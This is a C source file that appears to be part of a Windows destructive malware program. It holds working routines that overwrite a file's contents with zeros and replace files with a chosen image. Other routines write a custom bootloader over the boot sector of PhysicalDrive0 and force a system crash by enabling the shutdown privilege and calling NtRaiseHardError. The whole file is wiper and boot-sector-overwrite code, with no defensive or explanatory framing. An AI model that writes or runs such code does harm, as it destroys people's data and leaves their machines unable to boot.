#include "utils.h"

typedef NTSTATUS(NTAPI* NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
typedef NTSTATUS(NTAPI* RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

BOOL ZeroOutFile(LPCWSTR filename) {
    HANDLE file = CreateFileW(filename, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (file == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    DWORD size = GetFileSize(file, NULL);

    char buffer[BUFFER_SIZE] = {0};
    DWORD written = 0;

    for (size_t position = 0; position < size; position += BUFFER_SIZE) {
        if (WriteFile(file, buffer, BUFFER_SIZE, &written, NULL) == FALSE) {
            return FALSE;
        }

        if (written <= 0) {
            break;
        }
    }

    return CloseHandle(file);
}

BOOL ReplaceImage(LPCWSTR filename) {
    HANDLE source = CreateFileW((LPCWSTR)IMAGE_PATH, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE destination = CreateFileW(filename, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (source == INVALID_HANDLE_VALUE || destination == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    DWORD size = GetFileSize(source, NULL);
    char buffer[size];

    if (!ReadFile(source, buffer, size, NULL, NULL)) {
        return FALSE;
    }
    if (!WriteFile(destination, buffer, size, NULL, NULL)) {
        return FALSE;
    }

    return CloseHandle(source) && CloseHandle(destination);
}

BOOL OverwriteBootloader() {
    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE bootloader = CreateFileW((LPCWSTR)BOOTLOADER_PATH, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (drive == INVALID_HANDLE_VALUE || bootloader == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    DWORD size = GetFileSize(bootloader, NULL);
    char buffer[size];

    if (!ReadFile(bootloader, buffer, size, NULL, NULL)) {
        return FALSE;
    }
    if (!WriteFile(drive, buffer, size, NULL, NULL)) {
        return FALSE;
    }

    return CloseHandle(drive) && CloseHandle(bootloader);
}

void TriggerBSOD() {
    HMODULE ntdll = GetModuleHandle("ntdll.dll");

    LPVOID RaiseHardErrorAddress = GetProcAddress(ntdll, "NtRaiseHardError");
    LPVOID AdjustPrivilegeAddress = GetProcAddress(ntdll, "RtlAdjustPrivilege");

    NtRaiseHardError RaiseHardError = (NtRaiseHardError)RaiseHardErrorAddress;
    RtlAdjustPrivilege AdjustPrivilege = (RtlAdjustPrivilege)AdjustPrivilegeAddress;

    AdjustPrivilege(19, TRUE, FALSE, NULL);
    RaiseHardError(STATUS_INTEGER_DIVIDE_BY_ZERO, 0, 0, NULL, 6, NULL);
}